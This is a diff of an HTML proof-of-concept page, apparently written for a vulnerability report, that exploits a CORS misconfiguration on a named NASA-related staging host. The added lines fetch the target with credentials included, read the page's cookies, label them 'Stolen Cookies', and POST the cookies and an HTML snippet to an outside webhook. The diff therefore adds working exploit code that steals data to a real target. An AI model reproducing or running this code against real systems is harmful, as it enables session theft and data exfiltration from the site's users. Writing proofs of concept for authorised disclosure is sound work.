@@ -1,11 +1,11 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>NASA CORS Leak PoC</title>
   <meta charset="UTF-8">
+  <title>NASA CORS Session Exploit PoC</title>
 </head>
-<body style="background:#111;color:#0f0;font-family:monospace;padding:20px;">
-  <h2>Simulating NASA CORS Exploit (No-Creds)...</h2>
+<body style="background:#111;color:#0f0;font-family:monospace;padding:20px">
+  <h2>Simulating NASA CORS Exploit...</h2>
   <pre id="output">Loading...</pre>
 
   <script>
@@ -13,29 +13,32 @@
 
     fetch("https://datasearchstaging.globe.gov/", {
       method: "GET",
-      mode: "cors" // no credentials
+      credentials: "include",
+      mode: "cors"
     })
     .then(res => res.text())
     .then(html => {
+      const cookies = document.cookie || "No cookies (likely HttpOnly)";
       const snippet = html.slice(0, 500);
 
-      // عرض HTML فقط (no cookies)
+      // عرض الكوكيز و HTML في الصفحة
       document.getElementById("output").innerText =
-        "HTML Snippet:\n" + snippet;
+        "Stolen Cookies:\n" + cookies + "\n\nHTML Snippet:\n" + snippet;
 
-      // إرسال إلى Webhook كدليل
+      // إرسال إلى Webhook
       fetch(webhook, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          origin: location.origin,
+          origin_used: location.origin,
           target: "https://datasearchstaging.globe.gov/",
+          stolen_cookies: cookies,
           html_snippet: snippet
         })
       });
     })
-    .catch(error => {
-      document.getElementById("output").innerText = "❌ Failed:\n" + error;
+    .catch(err => {
+      document.getElementById("output").innerText = "❌ Failed:\n" + err;
     });
   </script>
 </body>
